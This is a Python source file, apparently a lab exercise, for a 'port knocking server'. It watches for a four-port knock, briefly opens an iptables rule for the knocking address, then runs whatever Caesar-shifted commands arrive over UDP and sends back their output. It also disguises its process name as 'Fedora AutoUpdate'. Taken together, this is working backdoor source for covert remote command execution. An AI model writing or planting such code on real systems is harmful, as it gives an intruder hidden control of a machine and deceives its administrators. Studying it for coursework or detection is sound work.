#port knocking server

#importing libraries
import socket
import sys
import subprocess
from pylibpcap.base import Sniff
from struct import *
import socket
from ctypes import *
import threading
import time
import setproctitle


port = 9000

def ceaser(plaintext, shift):
    ciphertext = ""
    for c in plaintext:
        if c.isalpha():
            if c.isupper():
                ciphertext += chr((ord(c) + shift - 65) % 26 + 65)
            else:
                ciphertext += chr((ord(c) + shift - 97) % 26 + 97)
        else:
            ciphertext += c
    return ciphertext


def openfirewall(addr):
    #open the firewall to addr for 10 seconds
    subprocess.call(["sudo", "iptables", "-I", "INPUT", "1", "-p", "udp", "-s", addr, "--dport", "9000", "-j", "ACCEPT"])
    print("[+] Firewall opened for", addr)
    closefirewall(addr)

def closefirewall(addr):
    time.sleep(10)
    subprocess.call(["sudo", "iptables", "-D", "INPUT", "-p", "udp", "-s", addr, "--dport", "9000", "-j", "ACCEPT"])
    print("[+] Firewall closed")

def sniffer():
    connections = {}
    print("[+] Sniffing for connections...")
    filter = "port 1000 or port 2000 or port 3000 or port 4000"
    sniffobj = Sniff("wlo1",filters=filter, count=-1, out_file="sniff.pcap")
    for plen, t, buf in sniffobj.capture():
        source_addr = socket.inet_ntoa(buf[26:30])
        dest_port = unpack("!H", buf[36:38])[0]
        
        if source_addr not in connections:
            connections[source_addr] = [0,0,0,0]
            connections[source_addr][int(dest_port/1000)-1] = 1
        else:
            connections[source_addr][int(dest_port/1000)-1] += 1
        print(connections)
        if sum(connections[source_addr]) == 4:
            openfirewall(source_addr)
            connections[source_addr] = [0,0,0,0]

def server():
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.bind(('', port))
    print("[+] Server is running...")
    server.setblocking(0)
    while True:
        #listening for connections
        # print("[+] Listening for connections...")
        try:
            data, addr = server.recvfrom(1024)
            print("[+] Connection from", addr)
            print(data)
            data = write_to_bash(data.decode())
            # print(data)
            server.sendto(data, addr)
        except:
            pass

def main():
    s = threading.Thread(target=server)
    s.start()
    t = threading.Thread(target=sniffer, args=())
    t.start()


def write_to_bash(data):
    #decrypt the data
    data = ceaser(data, -3)
    print(data)
    command = data.split(" ")
    bash = subprocess.run(command, stdout=subprocess.PIPE)
    # bash = subprocess.Popen(data, executable='/bin/bash', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # print(read_from_bash(bash))
    return bash.stdout
    # bash.stdin.flush()

def change_proc_name():
    #change process name
    setproctitle.setproctitle("Fedora AutoUpdate")

if __name__ == '__main__':
    #change process name
    change_proc_name()

    try:
        main()
    except KeyboardInterrupt:
        print("[+] Exiting...")
        sys.exit()